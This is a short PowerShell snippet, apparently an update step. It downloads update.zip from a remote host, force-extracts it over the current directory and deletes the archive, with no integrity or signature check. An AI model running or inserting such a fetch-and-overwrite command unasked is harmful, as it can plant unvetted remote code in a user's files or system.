$temp = (New-Guid).toString() + '.zip';
Invoke-WebRequest -Uri https://ec.nyaser.tk/update.zip -OutFile $temp;
Expand-Archive -Path $temp -DestinationPath . -Force;
Remove-Item $temp;
